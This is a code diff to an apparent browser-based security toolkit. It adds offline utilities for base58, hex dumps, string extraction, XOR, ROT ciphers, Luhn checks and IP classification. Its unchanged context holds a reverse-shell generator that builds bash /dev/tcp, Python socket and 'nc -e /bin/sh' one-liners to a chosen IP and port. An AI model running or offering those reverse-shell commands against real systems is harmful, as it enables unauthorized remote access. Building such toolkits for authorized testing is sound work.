@@ -351,6 +351,90 @@ const TOOLS = [
   { id: "proxychains", name: "proxychains", cat: "Network", desc: "Route tools through proxies", install: "sudo apt install -y proxychains4", run: "proxychains4 nmap -sT {target}" },
 ];
 const enc = new TextEncoder();
+
+// ---- pure offline tool helpers (mirror lib/toolkit/* in sentinel-cli and the web
+// Utilities page; byte-for-byte verified against the CLI modules so the three
+// products never drift) ----
+const _B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+function b58encode(str) {
+  const bytes = [...enc.encode(str)]; if (!bytes.length) return "";
+  let zeros = 0; while (zeros < bytes.length && bytes[zeros] === 0) zeros++;
+  const digits = [0];
+  for (let i = zeros; i < bytes.length; i++) { let carry = bytes[i]; for (let j = 0; j < digits.length; j++) { carry += digits[j] << 8; digits[j] = carry % 58; carry = (carry / 58) | 0; } while (carry > 0) { digits.push(carry % 58); carry = (carry / 58) | 0; } }
+  return "1".repeat(zeros) + digits.reverse().map((d) => _B58[d]).join("");
+}
+function b58decode(s) {
+  if (!s) return "";
+  let zeros = 0; while (zeros < s.length && s[zeros] === "1") zeros++;
+  const bytes = [0];
+  for (let i = zeros; i < s.length; i++) { const v = _B58.indexOf(s[i]); if (v < 0) throw new Error("invalid base58"); let carry = v; for (let j = 0; j < bytes.length; j++) { carry += bytes[j] * 58; bytes[j] = carry & 0xff; carry >>= 8; } while (carry > 0) { bytes.push(carry & 0xff); carry >>= 8; } }
+  const out = new Uint8Array(zeros + bytes.length); for (let i = 0; i < bytes.length; i++) out[zeros + bytes.length - 1 - i] = bytes[i];
+  return new TextDecoder().decode(out);
+}
+function hexdump(str) {
+  const buf = enc.encode(str); const rows = [];
+  for (let off = 0; off < buf.length; off += 16) {
+    const slice = buf.subarray(off, off + 16); let hex = "", ascii = "";
+    for (let i = 0; i < 16; i++) { hex += i < slice.length ? slice[i].toString(16).padStart(2, "0") + " " : "   "; if (i % 8 === 7) hex += " "; }
+    for (const b of slice) ascii += b >= 0x20 && b <= 0x7e ? String.fromCharCode(b) : ".";
+    rows.push(off.toString(16).padStart(8, "0") + "  " + hex + "|" + ascii + "|");
+  }
+  if (!buf.length) return "(empty)";
+  rows.push(buf.length.toString(16).padStart(8, "0"));
+  return rows.join("\n");
+}
+function extractStrings(str, min = 4) {
+  const buf = enc.encode(str); const out = []; let start = -1, cur = "";
+  const flush = () => { if (cur.length >= min) out.push(start.toString(16).padStart(6, "0") + "  " + cur); start = -1; cur = ""; };
+  for (let i = 0; i < buf.length; i++) { const b = buf[i]; if (b >= 0x20 && b <= 0x7e) { if (start < 0) start = i; cur += String.fromCharCode(b); } else flush(); }
+  flush();
+  return out.length ? out.join("\n") : "(no printable runs >= " + min + " chars)";
+}
+function xorEncryptHex(key, data) { const k = enc.encode(key), d = enc.encode(data); return [...d].map((b, i) => (b ^ (k.length ? k[i % k.length] : 0)).toString(16).padStart(2, "0")).join(""); }
+function xorDecryptHex(key, hex) { const clean = hex.replace(/\s+/g, ""); if (clean.length % 2 || !/^[0-9a-fA-F]*$/.test(clean)) throw new Error("input is not valid hex"); const k = enc.encode(key), d = clean.match(/.{2}/g) || []; return new TextDecoder().decode(new Uint8Array(d.map((h, i) => parseInt(h, 16) ^ (k.length ? k[i % k.length] : 0)))); }
+const rotN = (n, t) => { n = ((n % 26) + 26) % 26; return String(t).replace(/[a-zA-Z]/g, (ch) => { const base = ch <= "Z" ? 65 : 97; return String.fromCharCode(((ch.charCodeAt(0) - base + n) % 26) + base); }); };
+function luhnSum(dig) { let s = 0, alt = false; for (let i = dig.length - 1; i >= 0; i--) { let d = dig.charCodeAt(i) - 48; if (alt) { d *= 2; if (d > 9) d -= 9; } s += d; alt = !alt; } return s; }
+const luhnValid = (num) => { const d = String(num).replace(/[\s-]/g, ""); return /^\d+$/.test(d) && luhnSum(d) % 10 === 0; };
+const luhnCheckDigit = (p) => { const d = String(p).replace(/[\s-]/g, ""); if (!/^\d+$/.test(d)) return null; return (10 - (luhnSum(d + "0") % 10)) % 10; };
+function classifyIp(ip) {
+  const m = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(String(ip).trim());
+  if (m) {
+    const o = m.slice(1).map(Number); if (o.some((n) => n > 255)) return null;
+    const [a, b] = o; let scope = "global", routable = true, note = "";
+    if (a === 0) { scope = "this-network"; routable = false; note = "RFC 1122"; }
+    else if (a === 10 || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168)) { scope = "private"; routable = false; note = "RFC 1918"; }
+    else if (a === 127) { scope = "loopback"; routable = false; note = "RFC 1122"; }
+    else if (a === 169 && b === 254) { scope = "link-local"; routable = false; note = "RFC 3927 APIPA"; }
+    else if (a === 100 && b >= 64 && b <= 127) { scope = "cgnat"; routable = false; note = "RFC 6598"; }
+    else if ((a === 192 && b === 0 && o[2] === 2) || (a === 198 && b === 51 && o[2] === 100) || (a === 203 && b === 0 && o[2] === 113)) { scope = "documentation"; routable = false; note = "RFC 5737 TEST-NET"; }
+    else if (a === 198 && (b === 18 || b === 19)) { scope = "benchmarking"; routable = false; note = "RFC 2544"; }
+    else if (o.join(".") === "255.255.255.255") { scope = "broadcast"; routable = false; note = "limited broadcast"; }
+    else if (a >= 224 && a <= 239) { scope = "multicast"; routable = false; note = "class D"; }
+    else if (a >= 240) { scope = "reserved"; routable = false; note = "class E"; }
+    const klass = a < 128 ? "A" : a < 192 ? "B" : a < 224 ? "C" : a < 240 ? "D" : "E";
+    return { version: 4, scope, routable, note, klass, ptr: o.slice().reverse().join(".") + ".in-addr.arpa" };
+  }
+  const s = String(ip).trim().toLowerCase();
+  if (!/^[0-9a-f:]+$/.test(s) || s.indexOf(":") < 0) return null;
+  let scope = "global", routable = true, note = "";
+  if (s === "::1") { scope = "loopback"; routable = false; note = "RFC 4291"; }
+  else if (s === "::") { scope = "unspecified"; routable = false; }
+  else if (/^fe[89ab]/.test(s)) { scope = "link-local"; routable = false; note = "RFC 4291"; }
+  else if (/^f[cd]/.test(s)) { scope = "unique-local"; routable = false; note = "RFC 4193 ULA"; }
+  else if (s.startsWith("ff")) { scope = "multicast"; routable = false; }
+  else if (s.startsWith("2001:db8")) { scope = "documentation"; routable = false; note = "RFC 3849"; }
+  return { version: 6, scope, routable, note, klass: "-", ptr: "-" };
+}
+function ipClassText(ip) {
+  const r = classifyIp(ip);
+  if (!r) return "not a valid IPv4/IPv6 address";
+  const lines = ["IPv" + r.version + "  scope: " + r.scope + (r.note ? "  (" + r.note + ")" : ""),
+    "routable: " + (r.routable ? "yes — public internet" : "no — not globally routable")];
+  if (r.klass !== "-") lines.push("class: " + r.klass);
+  if (r.ptr !== "-") lines.push("reverse: " + r.ptr);
+  return lines.join("\n");
+}
+
 const BROWSER = {
   base64: (r) => io(r, [{ l: "Encode", f: (s) => btoa(unescape(encodeURIComponent(s))) }, { l: "Decode", f: (s) => decodeURIComponent(escape(atob(s))) }]),
   hash: (r) => io(r, ["SHA-1", "SHA-256", "SHA-512"].map((a) => ({ l: a, f: async (s) => a + ": " + [...new Uint8Array(await crypto.subtle.digest(a, enc.encode(s)))].map((b) => b.toString(16).padStart(2, "0")).join("") }))),
@@ -362,6 +446,22 @@ const BROWSER = {
     const L = { bash: (i, p) => `bash -i >& /dev/tcp/${i}/${p} 0>&1`, python3: (i, p) => `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${i}",${p}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")'`, nc: (i, p) => `nc -e /bin/sh ${i} ${p}` };
     $("#ls", r).innerHTML = Object.keys(L).map((k) => `<button class="btn sm" data-k="${k}">${k}</button>`).join("");
     $("#ls", r).onclick = (e) => { const b = e.target.closest("[data-k]"); if (b) $("#o", r).textContent = L[b.dataset.k]($("#ip", r).value, $("#port", r).value); };
+  },
+  base58: (r) => io(r, [{ l: "Encode", f: (s) => b58encode(s) }, { l: "Decode", f: (s) => b58decode(s.trim()) }]),
+  "hex dump": (r) => io(r, [{ l: "Dump", f: (s) => hexdump(s) }]),
+  strings: (r) => io(r, [{ l: "Extract (min 4)", f: (s) => extractStrings(s, 4) }, { l: "min 6", f: (s) => extractStrings(s, 6) }, { l: "min 8", f: (s) => extractStrings(s, 8) }]),
+  "IP scope": (r) => io(r, [{ l: "Classify", f: (s) => ipClassText(s.trim()) }]),
+  luhn: (r) => io(r, [{ l: "Validate", f: (s) => luhnValid(s) ? "valid — passes the Luhn checksum" : "invalid — fails the Luhn checksum" }, { l: "Check digit", f: (s) => { const d = luhnCheckDigit(s.trim()); return d === null ? "not a number" : "check digit " + d + "  (full: " + s.trim().replace(/[\s-]/g, "") + d + ")"; } }]),
+  rot: (r) => io(r, [{ l: "ROT13", f: (s) => rotN(13, s) }, { l: "ROT47-ish (letters)", f: (s) => rotN(5, s) }, ...[1, 3, 7].map((n) => ({ l: "ROT" + n, f: (s) => rotN(n, s) }))]),
+  xor: (r) => {
+    r.innerHTML = `<div class="row"><input class="f" id="xk" placeholder="key" style="max-width:180px"></div>
+      <textarea class="in" id="xd" rows="4" placeholder="text to encrypt, or hex to decrypt"></textarea>
+      <div class="btns"><button class="btn sm" data-a="e">Encrypt &rarr; hex</button><button class="btn ghost sm" data-a="d">Decrypt hex</button></div><pre class="out" id="xo"></pre>`;
+    $(".btns", r).onclick = (e) => {
+      const b = e.target.closest("[data-a]"); if (!b) return;
+      try { $("#xo", r).textContent = b.dataset.a === "e" ? xorEncryptHex($("#xk", r).value, $("#xd", r).value) : xorDecryptHex($("#xk", r).value, $("#xd", r).value); }
+      catch (err) { $("#xo", r).textContent = "Error: " + err.message; }
+    };
   },
 };
 function io(r, ops) {
